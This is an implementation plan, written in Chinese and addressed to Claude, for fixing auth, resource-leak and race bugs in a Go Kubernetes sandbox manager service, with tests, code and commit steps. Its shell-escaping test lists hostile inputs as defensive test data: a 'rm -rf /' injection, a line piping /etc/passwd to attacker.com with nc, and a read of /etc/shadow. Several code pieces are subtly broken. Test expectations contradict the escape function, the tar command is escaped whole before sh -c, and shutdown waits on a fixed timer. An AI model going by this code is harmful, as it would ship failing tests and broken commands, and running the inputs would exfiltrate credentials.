# mbos-sandbox v1 I02 完整稳定性改进实施计划

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**目标:** 修复收口检查中发现的全部 37 个问题（安全漏洞 + 资源泄漏 + 逻辑错误 + 脚本错误），达到生产稳定运行标准

**架构:** 基于现有 Go 服务架构，修复认证、资源管理、错误处理问题。采用 Context 传播 + 超时策略作为 Go goroutine 管理的最佳实践。

**技术栈:** Go 1.21+, Kubernetes client-go, MinIO/S3 SDK, WebSocket (gorilla/websocket)

---

## 前置条件

**验证环境:**
```bash
# 确认在正确的分支
git branch --show-current
# 预期: vk/5c22-mbos-sandbox-i02

# 确认没有未提交的更改
git status
# 预期: clean working tree
```

---

## Phase 1: 安全基础（阻塞发布）

### Task 1.1: Service Key 必填验证

**问题:** `SERVICE_KEYS` 为空时静默禁用所有认证

**文件:**
- Modify: `manager-service/internal/auth/servicekey.go`

**Step 1: 添加单元测试 - 空 SERVICE_KEYS 应该返回错误**

```go
// manager-service/internal/auth/servicekey_test.go
func TestNewValidator_EmptyKeys_ReturnsError(t *testing.T) {
    _, err := NewValidator("")
    assert.Error(t, err)
    assert.Contains(t, err.Error(), "SERVICE_KEYS cannot be empty")
}

func TestNewValidator_WhitespaceOnlyKeys_ReturnsError(t *testing.T) {
    _, err := NewValidator("   ")
    assert.Error(t, err)
    assert.Contains(t, err.Error(), "SERVICE_KEYS cannot be empty")
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./internal/auth/... -v -run TestNewValidator_EmptyKeys
# 预期: FAIL - test expects error but gets nil
```

**Step 3: 修改 NewValidator 函数**

```go
// manager-service/internal/auth/servicekey.go
func NewValidator(keysStr string) (*Validator, error) {
    keys := parseKeys(keysStr)

    // 修改前: if len(keys) == 0 { log...; return &Validator{keys: nil} }
    // 修改后:
    if len(keys) == 0 {
        return nil, fmt.Errorf("SERVICE_KEYS cannot be empty: service requires authentication")
    }

    return &Validator{keys: keys}, nil
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/auth/... -v -run TestNewValidator
# 预期: PASS
```

**Step 5: 集成测试 - 服务启动失败**

```bash
# 测试服务在空 SERVICE_KEYS 时拒绝启动
SERVICE_KEYS="" ./manager-service/manager
# 预期: 退出并显示错误信息
```

**Step 6: Commit**

```bash
git add manager-service/internal/auth/
git commit -m "fix(auth): require SERVICE_KEYS to be non-empty

- Service startup fails if SERVICE_KEYS is empty or whitespace
- Prevents accidental auth bypass in production
- Fixes security issue 1.5 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 1.2: WebSocket 认证绕过修复

**问题:** `/ws` 端点完全绕过认证中间件

**文件:**
- Modify: `manager-service/internal/app/app.go`
- Test: `manager-service/integration/websocket_auth_test.go`

**Step 1: 添加集成测试 - 无 Service Key 的 WebSocket 连接被拒绝**

```go
// manager-service/integration/websocket_auth_test.go
func TestWebSocket_NoServiceKey_Returns401(t *testing.T) {
    // 启动测试服务器
    testServer := setupTestServer(t)
    defer testServer.Close()

    // 尝试无 service key 连接
    wsURL := fmt.Sprintf("ws://%s/ws", testServer.addr)
    _, _, err := websocket.DefaultDialer.Dial(wsURL, nil)

    // 预期连接失败
    assert.Error(t, err)
}

func TestWebSocket_InvalidServiceKey_Returns401(t *testing.T) {
    testServer := setupTestServer(t)
    defer testServer.Close()

    // 无效的 service key
    wsURL := fmt.Sprintf("ws://%s/ws?service_key=invalid", testServer.addr)
    _, _, err := websocket.DefaultDialer.Dial(wsURL, nil)

    assert.Error(t, err)
}

func TestWebSocket_ValidServiceKey_Connects(t *testing.T) {
    testServer := setupTestServerWithKey(t, "test-key-123")
    defer testServer.Close()

    // 有效的 service key
    wsURL := fmt.Sprintf("ws://%s/ws?service_key=test-key-123", testServer.addr)
    conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)

    assert.NoError(t, err)
    conn.Close()
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./integration/... -v -run TestWebSocket
# 预期: FAIL - 当前无 service key 也能连接
```

**Step 3: 修改 WebSocket 路由注册**

```go
// manager-service/internal/app/app.go

// 修改前
// mux.Handle("/ws", m.wsHandler)

// 修改后 - 添加认证包装
mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
    // 从 URL 参数获取 service key
    serviceKey := r.URL.Query().Get("service_key")

    // 验证 service key
    if !m.authValidator.ValidateServiceKey(serviceKey) {
        http.Error(w, "Unauthorized: invalid or missing service_key", http.StatusUnauthorized)
        return
    }

    // 认证通过，转发到 WebSocket handler
    m.wsHandler.ServeHTTP(w, r)
})
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./integration/... -v -run TestWebSocket
# 预期: PASS
```

**Step 5: 手动验证**

```bash
# 启动服务
SERVICE_KEYS="test-key-123" ./manager-service/manager &

# 测试无 key 连接（应失败）
wscat -c "ws://localhost:8080/ws"

# 测试有效 key 连接（应成功）
wscat -c "ws://localhost:8080/ws?service_key=test-key-123"
```

**Step 6: Commit**

```bash
git add manager-service/internal/app/app.go manager-service/integration/
git commit -m "fix(auth): add service key authentication to WebSocket endpoint

- WebSocket now requires service_key query parameter
- Returns 401 for missing or invalid keys
- Fixes security issue 1.1 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 1.3: 调试端点凭据暴露修复

**问题:** `/debug/config` 端点返回包含存储凭据的完整配置

**文件:**
- Modify: `manager-service/internal/app/app.go`
- Test: `manager-service/internal/app/app_test.go`

**Step 1: 添加单元测试**

```go
// manager-service/internal/app/app_test.go
func TestHandleDebugConfig_DoesNotExposeCredentials(t *testing.T) {
    mgr := createTestManager(t)
    req := httptest.NewRequest("GET", "/debug/config", nil)
    w := httptest.NewRecorder()

    mgr.handleDebugConfig(w, req)

    var result map[string]interface{}
    json.Unmarshal(w.Body.Bytes(), &result)

    // 验证敏感字段不存在
    _, hasAccessKey := result["storage_access_key"]
    _, hasSecretKey := result["storage_secret_key"]

    assert.False(t, hasAccessKey, "storage_access_key should not be exposed")
    assert.False(t, hasSecretKey, "storage_secret_key should not be exposed")

    // 验证非敏感字段存在
    assert.Contains(t, result, "storage_endpoint")
    assert.Contains(t, result, "storage_bucket")
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./internal/app/... -v -run TestHandleDebugConfig
# 预期: FAIL - 当前暴露所有配置
```

**Step 3: 修改 handleDebugConfig 函数**

```go
// manager-service/internal/app/app.go

func (m *Manager) handleDebugConfig(w http.ResponseWriter, r *http.Request) {
    // 修改前: json.NewEncoder(w).Encode(m.config)

    // 修改后: 只返回安全配置
    safeConfig := map[string]interface{}{
        // K8s 配置
        "k8s_namespace": m.config.K8sNamespace,
        "k8s_context":   m.config.K8sContext,

        // 存储配置（不包含凭据）
        "storage_endpoint": m.config.StorageEndpoint,
        "storage_bucket":   m.config.StorageBucket,
        "storage_region":   m.config.StorageRegion,
        "storage_use_ssl":  m.config.StorageUseSSL,

        // 服务配置
        "pod_image":          m.config.PodImage,
        "default_workspace":  m.config.DefaultWorkspaceDir,
        "session_ttl":        m.config.SessionTTL.String(),
        "snapshot_timeout":   m.config.SnapshotTimeout.String(),

        // 状态信息
        "uptime_seconds": time.Since(m.startTime).Seconds(),
    }

    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(safeConfig)
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/app/... -v -run TestHandleDebugConfig
# 预期: PASS
```

**Step 5: 手动验证**

```bash
curl http://localhost:8080/debug/config | jq .
# 验证: 不包含 storage_access_key 和 storage_secret_key
```

**Step 6: Commit**

```bash
git add manager-service/internal/app/
git commit -m "fix(security): hide sensitive credentials from debug endpoint

- /debug/config no longer exposes storage access/secret keys
- Returns safe subset of configuration only
- Fixes security issue 1.4 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 1.4: 命令注入修复

**问题:** shell 转义函数在特定场景下可能被绕过

**文件:**
- Modify: `manager-service/internal/exec/wrapper.go`
- Test: `manager-service/internal/exec/wrapper_test.go`

**Step 1: 添加安全测试用例**

```go
// manager-service/internal/exec/wrapper_test.go
func TestShellEscape_PreventsCommandInjection(t *testing.T) {
    testCases := []struct {
        name     string
        input    string
        expected string
    }{
        {
            name:     "simple command",
            input:    "echo hello",
            expected: "'echo hello'",
        },
        {
            name:     "command with semicolon",
            input:    "ls; rm -rf /",
            expected: "'ls; rm -rf /'",
        },
        {
            name:     "command with backtick",
            input:    "echo `whoami`",
            expected: "'echo '\\''`whoami'\\'''",
        },
        {
            name:     "command with pipe",
            input:    "cat /etc/passwd | nc attacker.com 1234",
            expected: "'cat /etc/passwd | nc attacker.com 1234'",
        },
        {
            name:     "command with dollar sign",
            input:    "echo $HOME",
            expected: "'echo \\$HOME'",
        },
        {
            name:     "command with newline",
            input:    "ls\ncat /etc/shadow",
            expected: "'ls\\ncat /etc/shadow'",
        },
    }

    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            result := ShellEscape(tc.input)
            // 验证转义后的字符串不会导致命令注入
            // 实际测试需要执行并验证结果
            assert.Equal(t, tc.expected, result)
        })
    }
}
```

**Step 2: 运行测试查看当前行为**

```bash
cd manager-service && go test ./internal/exec/... -v -run TestShellEscape
# 预期: 可能 FAIL - 检查当前实现是否正确处理所有边界情况
```

**Step 3: 改进 shell 转义函数**

```go
// manager-service/internal/exec/wrapper.go

// ShellEscape 转义 shell 参数以防止命令注入
// 使用单引号包裹，并转义内部的单引号
func ShellEscape(s string) string {
    if s == "" {
        return "''"
    }

    // 用单引号包裹整个字符串
    // 单引号内：除单引号外所有字符都是字面量
    // 单引号用 '\'' 结束单引号，转义单引号，重新开始单引号
    return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/exec/... -v -run TestShellEscape
# 预期: PASS
```

**Step 5: 集成测试 - 验证命令注入被阻止**

```bash
# 这个测试需要在实际容器中运行
# 验证恶意的命令字符串不会被执行
```

**Step 6: Commit**

```bash
git add manager-service/internal/exec/
git commit -m "fix(security): improve shell escaping to prevent command injection

- Use single-quote wrapping with proper escaping
- Prevents injection via semicolons, backticks, pipes, newlines
- Fixes security issue 1.3 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

## Phase 2: 资源泄漏修复

### Task 2.1: Context 传播模式 - SnapshotWorkspace 修复

**问题:** Goroutine 不检查 `ctx.Done()`，调用者取消后继续运行

**文件:**
- Modify: `manager-service/internal/k8s/snapshot.go`
- Test: `manager-service/internal/k8s/snapshot_test.go`

**Step 1: 添加 Context 取消测试**

```go
// manager-service/internal/k8s/snapshot_test.go

func TestSnapshotWorkspace_ContextCancellation_StopsGoroutine(t *testing.T) {
    if testing.Short() {
        t.Skip("requires actual k8s cluster")
    }

    client := setupTestClient(t)
    ctx, cancel := context.WithCancel(context.Background())

    // 启动快照
    reader, err := client.SnapshotWorkspace(ctx, "default", "test-pod")
    require.NoError(t, err)

    // 立即取消上下文
    cancel()

    // 读取应该返回错误或立即返回 EOF
    buf := make([]byte, 1024)
    n, err := reader.Read(buf)

    // 验证: 读取应该因为上下文取消而失败
    assert.Error(t, err)
    reader.Close()

    // 验证: 没有泄漏的 goroutine
    runtime.GC()
    time.Sleep(100 * time.Millisecond)
    // 在实际测试中，需要监控 goroutine 数量
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./internal/k8s/... -v -run TestSnapshotWorkspace
# 预期: FAIL - 当前 goroutine 不会响应上下文取消
```

**Step 3: 重写 SnapshotWorkspace 函数**

```go
// manager-service/internal/k8s/snapshot.go

func (c *Client) SnapshotWorkspace(ctx context.Context, namespace, podName string) (io.ReadCloser, error) {
    pr, pw := io.Pipe()

    go func() {
        defer pw.Close()

        // 检查上下文是否已取消
        select {
        case <-ctx.Done():
            pw.CloseWithError(ctx.Err())
            return
        default:
        }

        // 设置执行超时
        execCtx, cancel := context.WithTimeout(ctx, 2*time.Minute)
        defer cancel()

        // 检查 tmux 是否存在
        if !c.CheckTmux(execCtx, namespace, podName) {
            pw.CloseWithError(fmt.Errorf("tmux session not found"))
            return
        }

        // 执行 tar 命令
        cmd := fmt.Sprintf("cd /workspace && %s czf - .", c.tarPath)
        escapedCmd := shellEscape(cmd)

        execReq := c.client.CoreV1().RESTClient().Post().
            Resource("pods").
            Namespace(namespace).
            Name(podName).
            SubResource("exec").
            VersionedParams(&corev1.PodExecOptions{
                Command:   []string{"sh", "-c", escapedCmd},
                Container: "workspace",
                Stdout:    true,
                Stderr:    true,
            }, scheme.ParameterCodec)

        exec, err := remotecommand.NewSPDYExecutor(c.config, "POST", execReq.URL())
        if err != nil {
            pw.CloseWithError(err)
            return
        }

        // 检查上下文是否被取消（在执行前再次检查）
        select {
        case <-execCtx.Done():
            pw.CloseWithError(execCtx.Err())
            return
        default:
        }

        // 将输出写入管道
        err = exec.StreamWithContext(execCtx, remotecommand.StreamOptions{
            Stdout: pw,
            Stderr: pw,
        })

        if err != nil {
            pw.CloseWithError(err)
            return
        }
    }()

    return pr, nil
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/k8s/... -v -run TestSnapshotWorkspace
# 预期: PASS
```

**Step 5: Commit**

```bash
git add manager-service/internal/k8s/snapshot.go manager-service/internal/k8s/snapshot_test.go
git commit -m "fix(leak): add context cancellation support to SnapshotWorkspace

- Goroutine now checks ctx.Done() and exits early on cancellation
- Adds 2-minute timeout for snapshot operation
- Fixes resource leak issue 2.1, 2.3 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 2.2: Context 传播 - Downloader.Download 修复

**问题:** `Download` 中的 goroutine 使用 `context.Background()`，丢失取消传播

**文件:**
- Modify: `manager-service/internal/files/tar.go`
- Test: `manager-service/internal/files/tar_test.go`

**Step 1: 添加 Context 传播测试**

```go
// manager-service/internal/files/tar_test.go

func TestDownloader_Download_PropagatesContextCancellation(t *testing.T) {
    downloader := setupTestDownloader(t)

    ctx, cancel := context.WithCancel(context.Background())

    // 启动下载
    reader, err := downloader.Download(ctx, "default", "test-pod", "/workspace")
    require.NoError(t, err)

    // 立即取消
    cancel()

    // 读取应该因为取消而失败
    buf := make([]byte, 1024)
    n, err := reader.Read(buf)

    assert.Error(t, err)
    reader.Close()
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./internal/files/... -v -run TestDownloader_Download
# 预期: FAIL - 当前不传播上下文取消
```

**Step 3: 修改 Download 函数**

```go
// manager-service/internal/files/tar.go

func (d *Downloader) Download(ctx context.Context, namespace, podName, workspaceDir string) (io.ReadCloser, error) {
    pr, pw := io.Pipe()

    go func() {
        defer pw.Close()

        // 检查上下文取消
        select {
        case <-ctx.Done():
            pw.CloseWithError(ctx.Err())
            return
        default:
        }

        // 修改前: execCtx := context.Background()
        // 修改后: 使用传入的 context
        execCtx, cancel := context.WithTimeout(ctx, 2*time.Minute)
        defer cancel()

        // 检查 tmux
        if !d.k8sClient.CheckTmux(execCtx, namespace, podName) {
            pw.CloseWithError(fmt.Errorf("tmux session not found in pod %s", podName))
            return
        }

        // 执行 tar 命令
        cmd := fmt.Sprintf("cd %s && %s czf - .", shellEscape(workspaceDir), d.tarPath)
        escapedCmd := shellEscape(cmd)

        execReq := d.k8sClient.RESTClient().Post().
            Resource("pods").
            Namespace(namespace).
            Name(podName).
            SubResource("exec").
            VersionedParams(&corev1.PodExecOptions{
                Command:   []string{"sh", "-c", escapedCmd},
                Container: "workspace",
                Stdout:    true,
                Stderr:    true,
            }, scheme.ParameterCodec)

        exec, err := remotecommand.NewSPDYExecutor(d.k8sClient.Config(), "POST", execReq.URL())
        if err != nil {
            pw.CloseWithError(err)
            return
        }

        // 再次检查上下文
        select {
        case <-execCtx.Done():
            pw.CloseWithError(execCtx.Err())
            return
        default:
        }

        err = exec.StreamWithContext(execCtx, remotecommand.StreamOptions{
            Stdout: pw,
            Stderr: pw,
        })

        if err != nil {
            pw.CloseWithError(err)
            return
        }
    }()

    return pr, nil
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/files/... -v -run TestDownloader_Download
# 预期: PASS
```

**Step 5: Commit**

```bash
git add manager-service/internal/files/tar.go manager-service/internal/files/tar_test.go
git commit -m "fix(leak): propagate context in Downloader.Download

- Replaces context.Background() with passed context
- Goroutine now respects cancellation
- Fixes resource leak issue 2.2 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 2.3: 最终处理程序关闭问题修复

**问题:** 最终处理程序使用 `context.Background()` 启动，无法优雅停止

**文件:**
- Modify: `manager-service/internal/app/app.go`
- Test: `manager-service/internal/app/app_test.go`

**Step 1: 添加优雅关闭测试**

```go
// manager-service/internal/app/app_test.go

func TestManager_FinalizerHandlerGracefulShutdown(t *testing.T) {
    mgr := createTestManager(t)

    // 启动管理器
    ctx, cancel := context.WithCancel(context.Background())
    go mgr.Start(ctx)

    // 等待最终处理程序启动
    time.Sleep(100 * time.Millisecond)

    // 触发关闭
    cancel()

    // 验证: 最终处理程序应该快速退出（不超过 2 秒）
    timeout := time.After(2 * time.Second)
    done := make(chan bool)

    go func() {
        mgr.Wait() // 等待所有 goroutine 退出
        close(done)
    }()

    select {
    case <-done:
        // 成功退出
    case <-timeout:
        t.Fatal("finalizer handler did not shut down gracefully")
    }
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./internal/app/... -v -run TestManager_FinalizerHandler
# 预期: FAIL - 最终处理程序使用 Background() 上下文，无法关闭
```

**Step 3: 修改应用启动逻辑**

```go
// manager-service/internal/app/app.go

type Manager struct {
    // ... 现有字段 ...
    ctx        context.Context
    cancel     context.CancelFunc
}

func New(cfg *Config) (*Manager, error) {
    // ... 现有初始化代码 ...

    // 修改前: 没有 ctx 和 cancel 字段
    // 修改后: 添加可取消的上下文
    ctx, cancel := context.WithCancel(context.Background())

    return &Manager{
        // ... 现有字段 ...
        ctx:    ctx,
        cancel: cancel,
    }, nil
}

func (m *Manager) Start() error {
    log.Println("Starting manager service...")

    // 修改前: go m.finalizerHandler.Start(context.Background())
    // 修改后: 使用管理器的上下文
    go m.finalizerHandler.Start(m.ctx)

    // ... 其他启动逻辑 ...
}

func (m *Manager) Shutdown() error {
    log.Println("Shutting down manager service...")

    // 取消上下文，通知所有后台 goroutine 退出
    m.cancel()

    // 等待最终处理程序退出
    timeout := time.After(5 * time.Second)
    done := make(chan struct{})

    go func() {
        // 最终处理程序应该在 ctx.Done() 时退出
        <-time.After(100 * time.Millisecond)
        close(done)
    }()

    select {
    case <-done:
        log.Println("Finalizer handler stopped")
    case <-timeout:
        log.Println("Warning: finalizer handler did not stop in time")
    }

    // ... 其他清理逻辑 ...
    return nil
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/app/... -v -run TestManager_FinalizerHandler
# 预期: PASS
```

**Step 5: Commit**

```bash
git add manager-service/internal/app/
git commit -m "fix(leak): add graceful shutdown for finalizer handler

- Finalizer handler now uses Manager's cancelable context
- Properly stops on shutdown instead of running forever
- Fixes resource leak issue 2.4 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 2.4: 会话清理机制

**问题 1:** WebSocket 关闭时不清理会话和缓冲区
**问题 2:** 会话管理器没有后台清理过期会话

**文件:**
- Modify: `manager-service/internal/websocket/handler.go`
- Modify: `manager-service/internal/session/manager.go`
- Modify: `manager-service/internal/buffer/manager.go`
- Test: `manager-service/internal/websocket/handler_test.go`
- Test: `manager-service/internal/session/manager_test.go`

**Step 1: 添加会话清理测试**

```go
// manager-service/internal/websocket/handler_test.go

func TestHandler_HandleCreate_CleansUpOnDisconnect(t *testing.T) {
    handler := setupTestHandler(t)
    conn := setupTestWebSocket(t)

    // 创建会话
    createMsg := Message{
        Type: MsgTypeCreate,
        Payload: map[string]interface{}{
            "agent_thread_id": "test-session-123",
            // ... 其他必要字段 ...
        },
    }

    // 模拟创建会话
    go handler.handleCreate(conn, createMsg)

    // 等待会话创建
    time.Sleep(100 * time.Millisecond)

    // 验证会话存在
    session, exists := handler.sessionManager.Get("test-session-123")
    assert.True(t, exists)
    assert.NotNil(t, session)

    // 模拟连接关闭
    conn.Close()

    // 等待清理
    time.Sleep(200 * time.Millisecond)

    // 验证会话被删除
    _, exists = handler.sessionManager.Get("test-session-123")
    assert.False(t, exists, "session should be cleaned up after disconnect")

    // 验证缓冲区被删除
    _, exists = handler.bufferManager.Get("test-session-123")
    assert.False(t, exists, "buffer should be cleaned up after disconnect")
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./internal/websocket/... -v -run TestHandler_HandleCreate_CleansUp
# 预期: FAIL - 当前没有清理逻辑
```

**Step 3: 添加会话过期清理方法**

```go
// manager-service/internal/session/manager.go

// StartCleanup 启动后台清理过期会话的 goroutine
func (m *Manager) StartCleanup(ctx context.Context, interval time.Duration) {
    ticker := time.NewTicker(interval)
    defer ticker.Stop()

    log.Printf("Session cleanup started (interval=%v)", interval)

    for {
        select {
        case <-ctx.Done():
            log.Println("Session cleanup stopped")
            return
        case <-ticker.C:
            m.cleanupExpired()
        }
    }
}

// cleanupExpired 删除所有过期的会话
func (m *Manager) cleanupExpired() {
    m.mu.Lock()
    defer m.mu.Unlock()

    now := time.Now()
    deleted := 0

    for id, session := range m.sessions {
        if session.IsExpired(now) {
            delete(m.sessions, id)
            deleted++
            log.Printf("Cleaned up expired session: %s", id)
        }
    }

    if deleted > 0 {
        log.Printf("Cleaned up %d expired sessions, remaining: %d", deleted, len(m.sessions))
    }
}
```

**Step 4: 修改 WebSocket Handler 添加清理逻辑**

```go
// manager-service/internal/websocket/handler.go

func (h *Handler) handleCreate(wsConn *websocket.Conn, createMsg Message) {
    // 解析参数
    agentThreadID, ok := createMsg.Payload["agent_thread_id"].(string)
    if !ok {
        h.sendError(wsConn, "missing agent_thread_id")
        return
    }

    // ... 会话创建逻辑 ...

    // 添加 defer 清理 - 关键修复
    defer func() {
        log.Printf("Cleaning up session: %s", agentThreadID)

        // 删除会话
        if err := h.sessionManager.Delete(agentThreadID); err != nil {
            log.Printf("Error deleting session: %v", err)
        }

        // 删除缓冲区
        if err := h.bufferManager.Delete(agentThreadID); err != nil {
            log.Printf("Error deleting buffer: %v", err)
        }
    }()

    // ... 消息处理循环 ...
}
```

**Step 5: 修改应用启动，添加会话清理**

```go
// manager-service/internal/app/app.go

func (m *Manager) Start() error {
    log.Println("Starting manager service...")

    // 启动会话清理（每 5 分钟清理一次）
    go m.sessionManager.StartCleanup(m.ctx, 5*time.Minute)

    // ... 其他启动逻辑 ...
}
```

**Step 6: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/websocket/... -v -run TestHandler_HandleCreate_CleansUp
cd manager-service && go test ./internal/session/... -v -run TestManager_StartCleanup
# 预期: PASS
```

**Step 7: Commit**

```bash
git add manager-service/internal/websocket/handler.go manager-service/internal/session/manager.go manager-service/internal/buffer/manager.go
git commit -m "fix(leak): add session and buffer cleanup on disconnect

- WebSocket handler now cleans up session and buffer on close
- Session manager has background cleanup of expired sessions
- Fixes resource leak issues 3.1, 3.3, 2.8 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

## Phase 3: 逻辑错误修复

### Task 3.1: 存储客户端 Panic 风险修复

**问题:** `minio.ToErrorResponse(err)` 可能返回 `nil`，导致 panic

**文件:**
- Modify: `manager-service/internal/storage/client.go`
- Test: `manager-service/internal/storage/client_test.go`

**Step 1: 添加 Panic 防护测试**

```go
// manager-service/internal/storage/client_test.go

func TestUploadSnapshot_NonMinioError_NoPanic(t *testing.T) {
    client := setupTestStorageClient(t)

    // 模拟非 MinIO 错误（如网络错误、超时）
    ctx := context.Background()
    reader := strings.NewReader("test data")

    // 故意传递无效的 reader 来触发错误
    err := client.UploadSnapshot(ctx, "test-key", &errorReader{}, -1)

    // 验证: 不应该 panic
    assert.Error(t, err)

    // 验证错误消息不包含 nil 指针访问
    assert.NotContains(t, err.Error(), "nil pointer")
}

type errorReader struct{}

func (e *errorReader) Read(p []byte) (n int, err error) {
    return 0, fmt.Errorf("simulated read error")
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./internal/storage/... -v -run TestUploadSnapshot_NonMinioError
# 预期: 可能 PASS 或 FAIL，取决于错误处理
```

**Step 3: 修复错误处理逻辑**

```go
// manager-service/internal/storage/client.go

func (c *Client) UploadSnapshot(ctx context.Context, key string, reader io.Reader, size int64) error {
    // ... 上传逻辑 ...

    // 设置上传选项
    opts := minio.PutObjectOptions{
        ContentType: "application/x-gzip",
    }

    // 执行上传
    info, err := c.client.PutObject(ctx, c.bucketName, key, reader, size, opts)
    if err != nil {
        // 安全地处理错误
        errResp := minio.ToErrorResponse(err)

        if errResp != nil {
            // MinIO 错误 - 可以安全访问 errResp.Code
            return fmt.Errorf("upload failed: %s (code: %s, bucket: %s, key: %s)",
                errResp.Message, errResp.Code, c.bucketName, key)
        }

        // 非 MinIO 错误（如网络错误、超时、上下文取消）
        // 检查是否是上下文取消
        if ctx.Err() != nil {
            return fmt.Errorf("upload cancelled: %w", ctx.Err())
        }

        // 其他错误
        return fmt.Errorf("upload failed: %w", err)
    }

    log.Printf("Uploaded snapshot: %s (%d bytes)", key, info.Size)
    return nil
}

func (c *Client) DownloadSnapshot(ctx context.Context, key string) (io.ReadCloser, error) {
    // ... 下载逻辑 ...

    obj, err := c.client.GetObject(ctx, c.bucketName, key, minio.GetObjectOptions{})
    if err != nil {
        // 同样的安全处理
        errResp := minio.ToErrorResponse(err)

        if errResp != nil {
            return nil, fmt.Errorf("download failed: %s (code: %s)", errResp.Message, errResp.Code)
        }

        if ctx.Err() != nil {
            return nil, fmt.Errorf("download cancelled: %w", ctx.Err())
        }

        return nil, fmt.Errorf("download failed: %w", err)
    }

    return obj, nil
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/storage/... -v -run TestUploadSnapshot
# 预期: PASS
```

**Step 5: Commit**

```bash
git add manager-service/internal/storage/client.go manager-service/internal/storage/client_test.go
git commit -m "fix(panic): add nil check for minio error response

- Prevents panic when ToErrorResponse returns nil
- Safely handles non-MinIO errors (network, timeout, cancellation)
- Fixes panic risk issue 3.13 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 3.2: 双重会话创建竞态条件修复

**问题:** 检查并创建模式不是原子的

**文件:**
- Modify: `manager-service/internal/session/manager.go`
- Test: `manager-service/internal/session/manager_test.go`

**Step 1: 添加竞态条件测试**

```go
// manager-service/internal/session/manager_test.go

func TestManager_GetOrCreate_Concurrent(t *testing.T) {
    manager := NewManager(30 * time.Minute)

    agentThreadID := "concurrent-test-123"

    // 并发创建相同会话
    var wg sync.WaitGroup
    sessions := make([]*Session, 10)
    created := make([]bool, 10)

    for i := 0; i < 10; i++ {
        wg.Add(1)
        go func(idx int) {
            defer wg.Done()
            session, wasCreated, _ := manager.GetOrCreate(agentThreadID)
            sessions[idx] = session
            created[idx] = wasCreated
        }(i)
    }

    wg.Wait()

    // 验证: 只有一个 goroutine 创建了会话
    createdCount := 0
    for _, c := range created {
        if c {
            createdCount++
        }
    }
    assert.Equal(t, 1, createdCount, "only one goroutine should create the session")

    // 验证: 所有 goroutine 获得相同的会话
    for i := 1; i < len(sessions); i++ {
        assert.Equal(t, sessions[0].ID(), sessions[i].ID())
    }
}
```

**Step 2: 运行测试验证失败**

```bash
cd manager-service && go test ./internal/session/... -v -run TestManager_GetOrCreate_Concurrent -race
# 预期: 可能 PASS（如果已经有锁）或 FAIL（如果有竞态）
```

**Step 3: 确保原子操作**

```go
// manager-service/internal/session/manager.go

// GetOrCreate 获取或创建会话（原子操作）
func (m *Manager) GetOrCreate(agentThreadID string) (*Session, bool, error) {
    m.mu.Lock()
    defer m.mu.Unlock()

    // 先检查（持有锁期间）
    if session, exists := m.sessions[agentThreadID]; exists {
        return session, false, nil
    }

    // 创建新会话（持有锁期间，原子操作）
    session := NewSession(agentThreadID, m.defaultTTL)
    m.sessions[agentThreadID] = session

    log.Printf("Created new session: %s (TTL=%v)", agentThreadID, m.defaultTTL)
    return session, true, nil
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/session/... -v -run TestManager_GetOrCreate_Concurrent -race
# 预期: PASS
```

**Step 5: Commit**

```bash
git add manager-service/internal/session/manager.go manager-service/internal/session/manager_test.go
git commit -m "fix(race): ensure atomic session creation in GetOrCreate

- Session check and creation now happen within same lock
- Prevents duplicate session creation under concurrent access
- Fixes race condition issue 3.2 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 3.3: 最终处理程序重试机制

**问题:** `RemoveFinalizer` 没有重试逻辑，可能导致 pod 卡住

**文件:**
- Modify: `manager-service/internal/k8s/finalizer.go`
- Test: `manager-service/internal/k8s/finalizer_test.go`

**Step 1: 添加重试测试**

```go
// manager-service/internal/k8s/finalizer_test.go

func TestRemoveFinalizer_RetriesOnTransientError(t *testing.T) {
    client := setupMockK8sClient(t)

    // 模拟第一次失败，第二次成功
    attempt := 0
    client.MockUpdate(func(ctx context.Context, pod *corev1.Pod) (*corev1.Pod, error) {
        attempt++
        if attempt == 1 {
            return nil, fmt.Errorf("transient network error")
        }
        return pod, nil
    })

    err := client.RemoveFinalizer(context.Background(), "default", "test-pod", SnapshotFinalizer)

    // 验证: 应该重试并最终成功
    assert.NoError(t, err)
    assert.GreaterOrEqual(t, attempt, 2)
}
```

